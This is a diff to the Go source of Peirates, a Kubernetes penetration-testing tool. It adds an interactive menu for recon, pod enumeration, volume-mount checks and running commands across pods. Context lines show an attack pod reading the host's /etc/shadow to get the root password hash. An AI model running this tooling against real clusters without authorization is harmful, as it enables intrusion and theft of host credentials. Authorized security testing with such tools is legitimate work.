@@ -19,7 +19,7 @@ import (
 	"io/ioutil" // Utils for dealing with IO streams
 	"log"       // Logging utils
 	"math/rand" // Random module for creating random string building
-
+	"os"
 	// HTTP client/server
 	"os/exec"
 	"regexp"
@@ -152,15 +152,23 @@ func inAPod(connectionString ServerInfo) bool {
 
 }
 
+func getListOfPods(connectionString ServerInfo){
+	runningPods:= getPodList(connectionString)
+	for _, listpod := range runningPods { 
+		fmt.Println("Pod Name: " +listpod)
+	}
+
+}
+
 // execInAllPods() runs kubeData.command in all running pods
 func execInAllPods(connectionString ServerInfo, command string) {
 	runningPods := getPodList(connectionString)
 	for _, execPod := range runningPods {
 		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/bash", "-c", command)
 		if err != nil {
-			fmt.Println("- Executing "+command+" in Pod "+execPod+" failed: ", err)
+			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
 		} else {
-			fmt.Println("+ Executing " + command + " in Pod " + execPod + " succeded: ")
+			fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeded: ")
 			fmt.Println("\t" + string(execInPodOut))
 		}
 	}
@@ -174,9 +182,9 @@ func execInListPods(connectionString ServerInfo, pods []string, command string) 
 
 		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/bash", "-c", command)
 		if err != nil {
-			fmt.Println("- Executing "+command+" in Pod "+execPod+" failed: ", err)
+			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
 		} else {
-			fmt.Println("+ Executing " + command + " in Pod " + execPod + " succeded: ")
+			fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeded: ")
 			fmt.Println("\t" + string(execInPodOut))
 		}
 	}
@@ -350,13 +358,14 @@ type PodDetails struct {
 func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {
 	fmt.Println("+ Getting details for all pods")
 	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
+	println(string(podDetailOut))
 	if err != nil {
-		fmt.Println("- Unable to retrieve details from this pod: ", err)
+		fmt.Println("[-] Unable to retrieve details from this pod: ", err)
 	} else {
-		fmt.Println("+ Retrieving details for all pods was successful: ")
+		fmt.Println("[+] Retrieving details for all pods was successful: ")
 		err := json.Unmarshal(podDetailOut, &podDetails)
 		if err != nil {
-			fmt.Println("- Error unmarshaling data: ", err)
+			fmt.Println("[-] Error unmarshaling data: ", err)
 		}
 	}
 }
@@ -394,12 +403,12 @@ func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 	fmt.Println("+ Getting all Roles")
 	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
 	if err != nil {
-		fmt.Println("- Unable to retrieve roles from this pod: ", err)
+		fmt.Println("[-] Unable to retrieve roles from this pod: ", err)
 	} else {
-		fmt.Println("+ Retrieving roles was successful: ")
+		fmt.Println("[+] Retrieving roles was successful: ")
 		err := json.Unmarshal(rolesOut, &kubeRoles)
 		if err != nil {
-			fmt.Println("- Error unmarshaling data: ", err)
+			fmt.Println("[-] Error unmarshaling data: ", err)
 		}
 
 	}
@@ -473,7 +482,7 @@ spec:
 		log.Fatal(err)
 	} else {
 		attackPodName := "attack-pod-" + randomString
-		println("Executing code in " + attackPodName + " to get its underlying host's root password hash")
+		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash")
 		shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
 		if err != nil {
 			log.Fatal(err)
@@ -488,6 +497,69 @@ spec:
 	//fmt.Println(out)
 }
 
+
+func clear_screen() {
+	//fmt.Print("Press Enter to Proceed .....")
+	var input string
+	fmt.Scanln(&input)
+	//fmt.Print(input)
+	c := exec.Command("clear")
+	c.Stdout = os.Stdout
+	c.Run()
+}
+
+func banner() {
+clear_screen()
+
+name, err := os.Hostname()
+	if err != nil {
+		panic(err)
+	}
+
+
+println(`________________________________________
+|  ___  ____ _ ____ ____ ___ ____ ____ |
+|  |__] |___ | |__/ |__|  |  |___ [__  |
+|  |    |___ | |  \ |  |  |  |___ ___] |
+|______________________________________|
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
+,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
+,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
+,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
+,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
+,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
+,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
+,,..IIIIIIIII.............IIIIIIIII..,,,
+,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
+,..IIIIIIII...+++++++++++,..+IIIIIII..,,
+,..IIIIIII...+++++++++++++:..~IIIIII..,,
+,..IIIIII...++++++:++++++++=..,IIIII..,,
+,..IIIII...+....,++.++++:+.++...IIII..,,
+,,.+IIII...+..,+++++....+,.+...IIIII..,,
+,,..IIIII...+++++++++++++++...IIIII..:,,
+,,,..IIIII...+++++++++++++...IIIII7..,,,
+,,,,.,IIIII...+++++++++++...?IIIII..,,,,
+,,,,:..IIIII...............IIIII?..,,,,,
+,,,,,,..IIIII.............IIIII..,,,,,,,
+,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
+,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
+,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+________________________________________
+
+    Peirates v1.02 by InGuardians
+   https://www.inguardians.com/labs/
+
+----------------------------------------------------------------
+[+] User Token: Anonymous
+[+] Certificate Authority Certificate: acquired
+[+] Kubernetes API Server:  10.0.5.22
+[+] Current IP Address: 10.1.1.1
+[+] Current hostname:`, name)
+
+}
 //------------------------------------------------------------------------------------------------------------------------------------------------
 
 func PeiratesMain() {
@@ -502,41 +574,6 @@ func PeiratesMain() {
 	//kubeData.list = {}
 
 	// Run the option parser to initialize connectionStrings
-	println(`Peirates
-	________________________________________
-	|  ___  ____ _ ____ ____ ___ ____ ____ |
-	|  |__] |___ | |__/ |__|  |  |___ [__  |
-	|  |    |___ | |  \ |  |  |  |___ ___] |
-	|______________________________________|
-	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
-	,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
-	,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
-	,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
-	,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
-	,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
-	,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
-	,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
-	,,..IIIIIIIII.............IIIIIIIII..,,,
-	,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
-	,..IIIIIIII...+++++++++++,..+IIIIIII..,,
-	,..IIIIIII...+++++++++++++:..~IIIIII..,,
-	,..IIIIII...++++++:++++++++=..,IIIII..,,
-	,..IIIII...+....,++.++++:+.++...IIII..,,
-	,,.+IIII...+..,+++++....+,.+...IIIII..,,
-	,,..IIIII...+++++++++++++++...IIIII..:,,
-	,,,..IIIII...+++++++++++++...IIIII7..,,,
-	,,,,.,IIIII...+++++++++++...?IIIII..,,,,
-	,,,,:..IIIII...............IIIII?..,,,,,
-	,,,,,,..IIIII.............IIIII..,,,,,,,
-	,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
-	,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
-	,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
-	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
-	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
-	________________________________________`)
-
-	println("\n\nPeirates v1.02 by InGuardians")
-	println("https://www.inguardians.com/labs/\n")
 	parseOptions(&cmdOpts)
 
 	if inAPod(connectionString) {
@@ -546,6 +583,102 @@ func PeiratesMain() {
 	}
 
 	allPods := getPodList(connectionString)
+
+var input int
+for ok := true; ok; ok = (input != 2) {
+	banner()
+	println(`----------------------------------------------------------------
+Intial Compromise/Recon |
+-------------------------
+[1] Get service account from the filesystem
+[2] Get list of pods
+[3] Get complete info on all pods (json)
+----------------------------------------------------------------
+Vulnerabilities and Misconfiguration Searching |
+------------------------------------------------
+[4] Check all pods for volume mounts
+--------
+Pivots |
+----------------------------------------------------------------
+[5] Run command in one or all pods 
+------
+Misc |
+----------------------------------------------------------------
+[6] Shell out to bash
+[7] Build YAML Files
+[exit] Exit Peirates 
+----------------------------------------------------------------
+Peirates:># `)
+
+var input string
+var user_response string
+fmt.Scanln(&input)
+// Peirates 
+switch input {
+
+case "1":
+	break
+case "2":
+	println("\n[+] Printing a list of Pods in the cluster......")
+	getListOfPods(connectionString)
+case "exit":
+	break
+case "3":
+	GetPodsInfo(connectionString, &podInfo)
+	break
+case "4":
+	println("\n[1] Get all host mount points\n[2] Get volume mount points for a specific pod\n\nPeirates:># ")
+	fmt.Scanln(&input)
+	switch input {
+		case "1":
+			println("[+] Getting volume mounts for all pods")
+			GetHostMountPoints(podInfo)
+			//println("[+] Attempting to Mounting RootFS......")
+			//MountRootFS(allPods, connectionString)
+		case "2":
+			println("[+] Please provide the pod name: ")
+			fmt.Scanln(&user_response)
+			println("[+] Printing volume mount points for %s", user_response)
+			GetHostMountPointsForPod(podInfo, user_response)
+	}
+case "5":
+	banner()
+	println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
+	fmt.Scanln(&input)
+	println("[+] Please Provide the command to run in the pods: ")
+	fmt.Scanln(&cmdOpts.commandToRunInPods)
+		switch input {
+			case "1":
+				println("[+] Please Provide the specified pod to run the command: ")
+				fmt.Scanln(&cmdOpts.podsToRunTheCommandIn)
+				if cmdOpts.commandToRunInPods != "" {
+					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
+						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
+					}
+				}
+			case "2":
+				if cmdOpts.commandToRunInPods != "" {
+					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
+						execInAllPods(connectionString, cmdOpts.commandToRunInPods)
+					} 
+				}
+		}
+case "6":
+	break
+case "7":
+	break
+}
+}
+	//---------------------------------------------------------
+//	parseOptions(&cmdOpts)
+
+//	if inAPod(connectionString) {
+//		println("+ You are in a pod.")
+//	} else {
+//		println("- You are not in a Kubernetes pod.")
+//	}
+
+//	allPods := getPodList(connectionString)
 
 	GetRoles(connectionString, &kubeRoles)
 	GetPodsInfo(connectionString, &podInfo)
